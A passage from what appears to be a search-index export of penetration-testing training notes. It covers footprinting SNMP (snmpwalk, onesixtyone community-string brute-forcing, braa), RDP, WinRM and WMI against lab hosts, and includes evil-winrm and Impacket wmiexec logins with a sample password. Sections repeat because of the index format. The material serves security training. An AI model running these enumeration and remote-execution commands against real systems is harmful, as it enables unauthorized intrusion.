iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.25.1.1.0 = Timeticks: (3676678) 10:12:46.78 iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E5 09 14 0E 2B 2D 00 2B 02 00 iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216 iso.3.6.1.2.1.25.1.4.0 = STRING: \"BOOT_IMAGE=/boot/vmlinuz-5.11.0-34-generic root=UUID=9a6a5c52-f92a-42ea-8ddf-940d7e0f4223 ro quiet splash\" iso.3.6.1.2.1.25.1.5.0 = Gauge32: 3 iso.3.6.1.2.1.25.1.6.0 = Gauge32: 411 iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0 iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree) ...SNIP... iso.3.6.1.2.1.25.6.3.1.2.1232 = STRING: \"printer-driver-sag-gdi_0.1-7_all\" iso.3.6.1.2.1.25.6.3.1.2.1233 = STRING: \"printer-driver-splix_2.0.0+svn315-7fakesync1build1_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1234 = STRING: \"procps_2:3.3.16-1ubuntu2.3_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1235 = STRING: \"proftpd-basic_1.3.6c-2_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1236 = STRING: \"proftpd-doc_1.3.6c-2_all\" iso.3.6.1.2.1.25.6.3.1.2.1237 = STRING: \"psmisc_23.3-1_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1238 = STRING: \"publicsuffix_20200303.0012-1_all\" iso.3.6.1.2.1.25.6.3.1.2.1239 = STRING: \"pulseaudio_1:13.99.1-1ubuntu3.12_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1240 = STRING: \"pulseaudio-module-bluetooth_1:13.99.1-1ubuntu3.12_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1241 = STRING: \"pulseaudio-utils_1:13.99.1-1ubuntu3.12_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1242 = STRING: \"python-apt-common_2.0.0ubuntu0.20.04.6_all\" iso.3.6.1.2.1.25.6.3.1.2.1243 = STRING: \"python3_3.8.2-0ubuntu2_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1244 = STRING: \"python3-acme_1.1.0-1_all\" iso.3.6.1.2.1.25.6.3.1.2.1245 = STRING: \"python3-apport_2.20.11-0ubuntu27.21_all\" iso.3.6.1.2.1.25.6.3.1.2.1246 = STRING: \"python3-apt_2.0.0ubuntu0.20.04.6_amd64\" ...SNIP... In the case of a misconfiguration, we would get approximately the same results from snmpwalk as just shown above. Once we know the community string and the SNMP service that does not require authentication (versions 1, 2c), we can query internal system information OneSixtyOne hrmns@htb[/htb]$ sudo apt install onesixtyone hrmns@htb[/htb]$ onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10 .129.14.128 Scanning 1 hosts, 3220 communities 10.129.14.128 [public] Linux htb 5.11.0-37-generic #41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021 x86_64 Often, when certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify. However, if we imagine an extensive network with over 100 different servers managed using SNMP, the labels, in that case, will have some pattern to them. Once we know a community string, we can use it with braa to brute-force the individual OIDs and enumerate the information behind them. hrmns@htb[/htb]$ sudo apt install braa hrmns@htb[/htb]$ braa <community string>@<IP>:.1.3.6.* # Syntax hrmns@htb[/htb]$ braa public@10.129.14.128:.1.3.6.* 10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64 10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10 10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548 10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb 10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:htb 10.129.14.128:20ms:.1.3.6.1.2.1.1.6.0:US 10.129.14.128:20ms:.1.3.6.1.2.1.1.7.0:78 ...SNIP...","title":"SNMP"},{"location":"footprinting/snmp/#default-configuration","text":"hrmns@htb[/htb]$ cat /etc/snmp/snmpd.conf | grep -v \"#\" | sed -r '/^\\s*$/d' sysLocation Sitting on the Dock of the Bay sysContact Me <me@example.org> sysServices 72 master agentx agentaddress 127.0.0.1,[::1] view systemonly included .1.3.6.1.2.1.1 view systemonly included .1.3.6.1.2.1.25.1 rocommunity public default -V systemonly rocommunity6 public default -V systemonly rouser authPrivUser authpriv -V systemonly","title":"Default Configuration"},{"location":"footprinting/snmp/#dangerous-settings","text":"Settings Description rwuser noauth Provides access to the full OID tree without authentication. rwcommunity <community string> <IPv4 address> Provides access to the full OID tree regardless of where the requests were sent from. rwcommunity6 <community string> <IPv6 address> Same access as with rwcommunity with the difference of using IPv6.","title":"Dangerous Settings"},{"location":"footprinting/snmp/#footprinting-the-service","text":"We can use tools like snmpwalk , onesixtyone , and braa . Snmpwalk is used to query the OIDs with their information. Onesixtyone can be used to brute-force the names of the community strings since they can be named arbitrarily by the administrator. SNMPwalk hrmns@htb[/htb]$ snmpwalk -v2c -c public 10 .129.14.128 iso.3.6.1.2.1.1.1.0 = STRING: \"Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64\" iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10 iso.3.6.1.2.1.1.3.0 = Timeticks: (5134) 0:00:51.34 iso.3.6.1.2.1.1.4.0 = STRING: \"mrb3n@inlanefreight.htb\" iso.3.6.1.2.1.1.5.0 = STRING: \"htb\" iso.3.6.1.2.1.1.6.0 = STRING: \"Sitting on the Dock of the Bay\" iso.3.6.1.2.1.1.7.0 = INTEGER: 72 iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1 iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1 iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1 iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1 iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1 iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49 iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4 iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50 iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3 iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92 iso.3.6.1.2.1.1.9.1.3.1 = STRING: \"The SNMP Management Architecture MIB.\" iso.3.6.1.2.1.1.9.1.3.2 = STRING: \"The MIB for Message Processing and Dispatching.\" iso.3.6.1.2.1.1.9.1.3.3 = STRING: \"The management information definitions for the SNMP User-based Security Model.\" iso.3.6.1.2.1.1.9.1.3.4 = STRING: \"The MIB module for SNMPv2 entities\" iso.3.6.1.2.1.1.9.1.3.5 = STRING: \"View-based Access Control Model for SNMP.\" iso.3.6.1.2.1.1.9.1.3.6 = STRING: \"The MIB module for managing TCP implementations\" iso.3.6.1.2.1.1.9.1.3.7 = STRING: \"The MIB module for managing IP and ICMP implementations\" iso.3.6.1.2.1.1.9.1.3.8 = STRING: \"The MIB module for managing UDP implementations\" iso.3.6.1.2.1.1.9.1.3.9 = STRING: \"The MIB modules for managing SNMP Notification, plus filtering.\" iso.3.6.1.2.1.1.9.1.3.10 = STRING: \"The MIB module for logging SNMP Notifications.\" iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.25.1.1.0 = Timeticks: (3676678) 10:12:46.78 iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E5 09 14 0E 2B 2D 00 2B 02 00 iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216 iso.3.6.1.2.1.25.1.4.0 = STRING: \"BOOT_IMAGE=/boot/vmlinuz-5.11.0-34-generic root=UUID=9a6a5c52-f92a-42ea-8ddf-940d7e0f4223 ro quiet splash\" iso.3.6.1.2.1.25.1.5.0 = Gauge32: 3 iso.3.6.1.2.1.25.1.6.0 = Gauge32: 411 iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0 iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree) ...SNIP... iso.3.6.1.2.1.25.6.3.1.2.1232 = STRING: \"printer-driver-sag-gdi_0.1-7_all\" iso.3.6.1.2.1.25.6.3.1.2.1233 = STRING: \"printer-driver-splix_2.0.0+svn315-7fakesync1build1_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1234 = STRING: \"procps_2:3.3.16-1ubuntu2.3_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1235 = STRING: \"proftpd-basic_1.3.6c-2_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1236 = STRING: \"proftpd-doc_1.3.6c-2_all\" iso.3.6.1.2.1.25.6.3.1.2.1237 = STRING: \"psmisc_23.3-1_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1238 = STRING: \"publicsuffix_20200303.0012-1_all\" iso.3.6.1.2.1.25.6.3.1.2.1239 = STRING: \"pulseaudio_1:13.99.1-1ubuntu3.12_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1240 = STRING: \"pulseaudio-module-bluetooth_1:13.99.1-1ubuntu3.12_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1241 = STRING: \"pulseaudio-utils_1:13.99.1-1ubuntu3.12_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1242 = STRING: \"python-apt-common_2.0.0ubuntu0.20.04.6_all\" iso.3.6.1.2.1.25.6.3.1.2.1243 = STRING: \"python3_3.8.2-0ubuntu2_amd64\" iso.3.6.1.2.1.25.6.3.1.2.1244 = STRING: \"python3-acme_1.1.0-1_all\" iso.3.6.1.2.1.25.6.3.1.2.1245 = STRING: \"python3-apport_2.20.11-0ubuntu27.21_all\" iso.3.6.1.2.1.25.6.3.1.2.1246 = STRING: \"python3-apt_2.0.0ubuntu0.20.04.6_amd64\" ...SNIP... In the case of a misconfiguration, we would get approximately the same results from snmpwalk as just shown above. Once we know the community string and the SNMP service that does not require authentication (versions 1, 2c), we can query internal system information OneSixtyOne hrmns@htb[/htb]$ sudo apt install onesixtyone hrmns@htb[/htb]$ onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10 .129.14.128 Scanning 1 hosts, 3220 communities 10.129.14.128 [public] Linux htb 5.11.0-37-generic #41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021 x86_64 Often, when certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify. However, if we imagine an extensive network with over 100 different servers managed using SNMP, the labels, in that case, will have some pattern to them. Once we know a community string, we can use it with braa to brute-force the individual OIDs and enumerate the information behind them. hrmns@htb[/htb]$ sudo apt install braa hrmns@htb[/htb]$ braa <community string>@<IP>:.1.3.6.* # Syntax hrmns@htb[/htb]$ braa public@10.129.14.128:.1.3.6.* 10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64 10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10 10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548 10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb 10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:htb 10.129.14.128:20ms:.1.3.6.1.2.1.1.6.0:US 10.129.14.128:20ms:.1.3.6.1.2.1.1.7.0:78 ...SNIP...","title":"Footprinting the Service"},{"location":"footprinting/windows_remote_management_protocol/","text":"RDP \u00b6 The Remote Desktop Protocol ( RDP ) is a protocol developed by Microsoft for remote access to a computer running the Windows operating system. This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks. RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration. For an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside. If Network Address Translation ( NAT ) is used on the route between client and server, as is often the case with Internet connections, the remote computer needs the public IP address to reach the server. In addition, port forwarding must be set up on the NAT router in the direction of the server. Footprinting the Service \u00b6 Scanning the RDP service can quickly give us a lot of information about the host. For example, we can determine if NLA is enabled on the server or not, the product version, and the hostname. hrmns@htb[/htb]$ nmap -sV -sC 10 .129.201.248 -p3389 --script rdp* Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 15:45 CET Nmap scan report for 10.129.201.248 Host is up (0.036s latency). PORT STATE SERVICE VERSION 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-enum-encryption: | Security layer | CredSSP (NLA): SUCCESS | CredSSP with Early User Auth: SUCCESS |_ RDSTLS: SUCCESS | rdp-ntlm-info: | Target_Name: ILF-SQL-01 | NetBIOS_Domain_Name: ILF-SQL-01 | NetBIOS_Computer_Name: ILF-SQL-01 | DNS_Domain_Name: ILF-SQL-01 | DNS_Computer_Name: ILF-SQL-01 | Product_Version: 10.0.17763 |_ System_Time: 2021-11-06T13:46:00+00:00 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds In addition, we can use --packet-trace to track the individual packages and inspect their contents manually. We can see that the RDP cookies ( mstshash=nmap ) used by Nmap to interact with the RDP server can be identified by threat hunters and various security services such as Endpoint Detection and Response ( EDR ), and can lock us out as penetration testers on hardened networks. hrmns@htb[/htb]$ nmap -sV -sC 10 .129.201.248 -p3389 --packet-trace --disable-arp-ping -n Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:23 CET SENT (0.2506s) ICMP [10.10.14.20 > 10.129.201.248 Echo request (type=8/code=0) id=8338 seq=0] IP [ttl=53 id=5122 iplen=28 ] SENT (0.2507s) TCP 10.10.14.20:55516 > 10.129.201.248:443 S ttl=42 id=24195 iplen=44 seq=1926233369 win=1024 <mss 1460> SENT (0.2507s) TCP 10.10.14.20:55516 > 10.129.201.248:80 A ttl=55 id=50395 iplen=40 seq=0 win=1024 SENT (0.2517s) ICMP [10.10.14.20 > 10.129.201.248 Timestamp request (type=13/code=0) id=8247 seq=0 orig=0 recv=0 trans=0] IP [ttl=38 id=62695 iplen=40 ] RCVD (0.2814s) ICMP [10.129.201.248 > 10.10.14.20 Echo reply (type=0/code=0) id=8338 seq=0] IP [ttl=127 id=38158 iplen=28 ] SENT (0.3264s) TCP 10.10.14.20:55772 > 10.129.201.248:3389 S ttl=56 id=274 iplen=44 seq=2635590698 win=1024 <mss 1460> RCVD (0.3565s) TCP 10.129.201.248:3389 > 10.10.14.20:55772 SA ttl=127 id=38162 iplen=44 seq=3526777417 win=64000 <mss 1357> NSOCK INFO [0.4500s] nsock_iod_new2(): nsock_iod_new (IOD #1) NSOCK INFO [0.4500s] nsock_connect_tcp(): TCP connection requested to 10.129.201.248:3389 (IOD #1) EID 8 NSOCK INFO [0.4820s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.201.248:3389] Service scan sending probe NULL to 10.129.201.248:3389 (tcp) NSOCK INFO [0.4830s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 6000ms) EID 18 NSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: READ TIMEOUT for EID 18 [10.129.201.248:3389] Service scan sending probe TerminalServerCookie to 10.129.201.248:3389 (tcp) NSOCK INFO [6.4880s] nsock_write(): Write request for 42 bytes to IOD #1 EID 27 [10.129.201.248:3389] NSOCK INFO [6.4880s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 5000ms) EID 34 NSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 27 [10.129.201.248:3389] NSOCK INFO [6.5240s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 34 [10.129.201.248:3389] (19 bytes): .........4......... Service scan match (Probe TerminalServerCookie matched with TerminalServerCookie line 13640): 10.129.201.248:3389 is ms-wbt-server. Version: |Microsoft Terminal Services||| ...SNIP... NSOCK INFO [6.5610s] nsock_write(): Write request for 54 bytes to IOD #1 EID 27 [10.129.201.248:3389] NSE: TCP 10.10.14.20:36630 > 10.129.201.248:3389 | 00000000: 03 00 00 2a 25 e0 00 00 00 00 00 43 6f 6f 6b 69 *% Cooki 00000010: 65 3a 20 6d 73 74 73 68 61 73 68 3d 6e 6d 61 70 e: mstshash=nmap 00000020: 0d 0a 01 00 08 00 0b 00 00 00 ...SNIP... NSOCK INFO [6.6820s] nsock_write(): Write request for 57 bytes to IOD #2 EID 67 [10.129.201.248:3389] NSOCK INFO [6.6820s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 67 [10.129.201.248:3389] NSE: TCP 10.10.14.20:36630 > 10.129.201.248:3389 | SEND NSOCK INFO [6.6820s] nsock_read(): Read request from IOD #2 [10.129.201.248:3389] (timeout: 5000ms) EID 74 NSOCK INFO [6.7180s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 74 [10.129.201.248:3389] (211 bytes) NSE: TCP 10.10.14.20:36630 < 10.129.201.248:3389 | 00000000: 30 81 d0 a0 03 02 01 06 a1 81 c8 30 81 c5 30 81 0 0 0 00000010: c2 a0 81 bf 04 81 bc 4e 54 4c 4d 53 53 50 00 02 NTLMSSP 00000020: 00 00 00 14 00 14 00 38 00 00 00 35 82 8a e2 b9 8 5 00000030: 73 b0 b3 91 9f 1b 0d 00 00 00 00 00 00 00 00 70 s p 00000040: 00 70 00 4c 00 00 00 0a 00 63 45 00 00 00 0f 49 p L cE I 00000050: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30 L F - S Q L - 0 00000060: 00 31 00 02 00 14 00 49 00 4c 00 46 00 2d 00 53 1 I L F - S 00000070: 00 51 00 4c 00 2d 00 30 00 31 00 01 00 14 00 49 Q L - 0 1 I 00000080: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30 L F - S Q L - 0 00000090: 00 31 00 04 00 14 00 49 00 4c 00 46 00 2d 00 53 1 I L F - S 000000a0: 00 51 00 4c 00 2d 00 30 00 31 00 03 00 14 00 49 Q L - 0 1 I 000000b0: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30 L F - S Q L - 0 000000c0: 00 31 00 07 00 08 00 1d b3 e8 f2 19 d3 d7 01 00 1 000000d0: 00 00 00 ...SNIP... A Perl script named rdp-sec-check.pl has also been developed by Cisco CX Security Labs that can unauthentically identify the security settings of RDP servers based on the handshakes. RDP Security Check - Installation hrmns@htb[/htb]$ sudo cpan Loading internal logger. Log::Log4perl recommended for better logging CPAN.pm requires configuration, but most of it can be done automatically. If you answer 'no' below, you will enter an interactive dialog for each configuration option instead. Would you like to configure as much as possible automatically? [yes] yes Autoconfiguration complete. commit: wrote '/root/.cpan/CPAN/MyConfig.pm' You can re-run configuration any time with 'o conf init' in the CPAN shell cpan shell -- CPAN exploration and modules installation (v2.27) Enter 'h' for help. cpan[1]> install Encoding::BER Fetching with LWP: http://www.cpan.org/authors/01mailrc.txt.gz Reading '/root/.cpan/sources/authors/01mailrc.txt.gz' ............................................................................DONE ...SNIP... RDP Security Check hrmns@htb[/htb]$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check hrmns@htb[/htb]$ ./rdp-sec-check.pl 10 .129.201.248 Starting rdp-sec-check v0.9-beta ( http://labs.portcullis.co.uk/application/rdp-sec-check/ ) at Sun Nov 7 16:50:32 2021 [+] Scanning 1 hosts Target: 10.129.201.248 IP: 10.129.201.248 Port: 3389 [+] Checking supported protocols [-] Checking if RDP Security (PROTOCOL_RDP) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER [-] Checking if TLS Security (PROTOCOL_SSL) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER [-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Supported [+] Checking RDP Security Layer [-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported [-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Not supported [-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Not supported [-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Not supported [-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Not supported [+] Summary of protocol support [-] 10.129.201.248:3389 supports PROTOCOL_SSL : FALSE [-] 10.129.201.248:3389 supports PROTOCOL_HYBRID: TRUE [-] 10.129.201.248:3389 supports PROTOCOL_RDP : FALSE [+] Summary of RDP encryption support [-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_NONE : FALSE [-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_40BIT : FALSE [-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_128BIT : FALSE [-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_56BIT : FALSE [-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_FIPS : FALSE [+] Summary of security issues rdp-sec-check v0.9-beta completed at Sun Nov 7 16:50:33 2021 WinRM \u00b6 The Windows Remote Management ( WinRM ) is a simple Windows integrated remote management protocol based on the command line. WinRM uses the Simple Object Access Protocol ( SOAP ) to establish connections to remote hosts and their applications. Therefore, WinRM must be explicitly enabled and configured starting with Windows 10. WinRM relies on TCP ports 5985 and 5986 for communication, with the last port 5986 using HTTPS , as ports 80 and 443 were previously used for this task. Footprinting the Service \u00b6 We will see that only HTTP ( TCP 5985 ) is used instead of HTTPS ( TCP 5986 ). rmns@htb[/htb]$ nmap -sV -sC 10 .129.201.248 -p5985,5986 --disable-arp-ping -n Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:31 CET Nmap scan report for 10.129.201.248 Host is up (0.030s latency). PORT STATE SERVICE VERSION 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds If we want to find out whether one or more remote servers can be reached via WinRM, we can easily do this with the help of PowerShell. We can use the tool called evil-winrm hrmns@htb[/htb]$ evil-winrm -i 10 .129.201.248 -u Cry0l1t3 -p P455w0rD! Evil-WinRM shell v3.3 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Cry0l1t3\\Documents> WMI \u00b6 Windows Management Instrumentation ( WMI ) is Microsoft's implementation and also an extension of the Common Information Model ( CIM ), core functionality of the standardized Web-Based Enterprise Management ( WBEM ) for the Windows platform. WMI allows read and write access to almost all settings on Windows systems. Understandably, this makes it the most critical interface in the Windows environment for the administration and remote maintenance of Windows computers, regardless of whether they are PCs or servers. WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console ( WMIC ). WMI is not a single program but consists of several programs and various databases, also known as repositories. Footprinting the Service \u00b6 The initialization of the WMI communication always takes place on TCP port 135 , and after the successful establishment of the connection, the communication is moved to a random port. For example, the program wmiexec.py from the Impacket toolkit can be used for this. hrmns@htb[/htb]$ /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3: \"P455w0rD!\" @10.129.201.248 \"hostname\" Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] SMBv3.0 dialect used ILF-SQL-01","title":"Windows"},{"location":"footprinting/windows_remote_management_protocol/#rdp","text":"The Remote Desktop Protocol ( RDP ) is a protocol developed by Microsoft for remote access to a computer running the Windows operating system. This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks. RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration. For an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside. If Network Address Translation ( NAT ) is used on the route between client and server, as is often the case with Internet connections, the remote computer needs the public IP address to reach the server. In addition, port forwarding must be set up on the NAT router in the direction of the server.","title":"RDP"},{"location":"footprinting/windows_remote_management_protocol/#footprinting-the-service","text":"Scanning the RDP service can quickly give us a lot of information about the host. For example, we can determine if NLA is enabled on the server or not, the product version, and the hostname. hrmns@htb[/htb]$ nmap -sV -sC 10 .129.201.248 -p3389 --script rdp* Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 15:45 CET Nmap scan report for 10.129.201.248 Host is up (0.036s latency). PORT STATE SERVICE VERSION 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-enum-encryption: | Security layer | CredSSP (NLA): SUCCESS | CredSSP with Early User Auth: SUCCESS |_ RDSTLS: SUCCESS | rdp-ntlm-info: | Target_Name: ILF-SQL-01 | NetBIOS_Domain_Name: ILF-SQL-01 | NetBIOS_Computer_Name: ILF-SQL-01 | DNS_Domain_Name: ILF-SQL-01 | DNS_Computer_Name: ILF-SQL-01 | Product_Version: 10.0.17763 |_ System_Time: 2021-11-06T13:46:00+00:00 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds In addition, we can use --packet-trace to track the individual packages and inspect their contents manually. We can see that the RDP cookies ( mstshash=nmap ) used by Nmap to interact with the RDP server can be identified by threat hunters and various security services such as Endpoint Detection and Response ( EDR ), and can lock us out as penetration testers on hardened networks. hrmns@htb[/htb]$ nmap -sV -sC 10 .129.201.248 -p3389 --packet-trace --disable-arp-ping -n Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:23 CET SENT (0.2506s) ICMP [10.10.14.20 > 10.129.201.248 Echo request (type=8/code=0) id=8338 seq=0] IP [ttl=53 id=5122 iplen=28 ] SENT (0.2507s) TCP 10.10.14.20:55516 > 10.129.201.248:443 S ttl=42 id=24195 iplen=44 seq=1926233369 win=1024 <mss 1460> SENT (0.2507s) TCP 10.10.14.20:55516 > 10.129.201.248:80 A ttl=55 id=50395 iplen=40 seq=0 win=1024 SENT (0.2517s) ICMP [10.10.14.20 > 10.129.201.248 Timestamp request (type=13/code=0) id=8247 seq=0 orig=0 recv=0 trans=0] IP [ttl=38 id=62695 iplen=40 ] RCVD (0.2814s) ICMP [10.129.201.248 > 10.10.14.20 Echo reply (type=0/code=0) id=8338 seq=0] IP [ttl=127 id=38158 iplen=28 ] SENT (0.3264s) TCP 10.10.14.20:55772 > 10.129.201.248:3389 S ttl=56 id=274 iplen=44 seq=2635590698 win=1024 <mss 1460> RCVD (0.3565s) TCP 10.129.201.248:3389 > 10.10.14.20:55772 SA ttl=127 id=38162 iplen=44 seq=3526777417 win=64000 <mss 1357> NSOCK INFO [0.4500s] nsock_iod_new2(): nsock_iod_new (IOD #1) NSOCK INFO [0.4500s] nsock_connect_tcp(): TCP connection requested to 10.129.201.248:3389 (IOD #1) EID 8 NSOCK INFO [0.4820s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.201.248:3389] Service scan sending probe NULL to 10.129.201.248:3389 (tcp) NSOCK INFO [0.4830s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 6000ms) EID 18 NSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: READ TIMEOUT for EID 18 [10.129.201.248:3389] Service scan sending probe TerminalServerCookie to 10.129.201.248:3389 (tcp) NSOCK INFO [6.4880s] nsock_write(): Write request for 42 bytes to IOD #1 EID 27 [10.129.201.248:3389] NSOCK INFO [6.4880s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 5000ms) EID 34 NSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 27 [10.129.201.248:3389] NSOCK INFO [6.5240s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 34 [10.129.201.248:3389] (19 bytes): .........4......... Service scan match (Probe TerminalServerCookie matched with TerminalServerCookie line 13640): 10.129.201.248:3389 is ms-wbt-server. Version: |Microsoft Terminal Services||| ...SNIP... NSOCK INFO [6.5610s] nsock_write(): Write request for 54 bytes to IOD #1 EID 27 